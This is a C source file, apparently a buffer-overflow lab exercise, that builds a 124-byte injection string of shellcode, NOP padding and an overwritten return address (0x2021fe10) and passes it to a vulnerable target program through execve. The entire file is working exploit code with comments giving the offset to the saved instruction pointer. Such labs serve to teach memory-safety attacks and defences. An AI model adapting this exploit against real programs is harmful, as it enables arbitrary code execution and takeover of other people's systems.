#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char * return_addr = (char*) 0x2021fe10;

	args[0] = TARGET;
	args[2] = NULL;
	env[0] = NULL;

	/*
	rip is 120B ( 0x78 ) away from the starting address of buf we want to overflow.

	bytes 120-124 will contain the return_addr

	injection buffer = 124B
	shellcode = 48B
	buf = 96B
	*/

	int inj_size = 124;
	
	// Injection string
	char injection[inj_size];
	bzero(injection, inj_size);

	// Concatenate shellcode to inj string
	strcat(injection, shellcode); 
	
	// Add 0x90 (NOP) after shellcode up to byte 120
	memset(&injection[strlen(injection)], 0x90, 120 - strlen(injection));

	// Overflow the return address to point to the beginning of injection string 
	memcpy(&injection[(120)], &(return_addr), sizeof(return_addr));

	// Pack injection string into args[1]
	args[1] = injection;
	
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
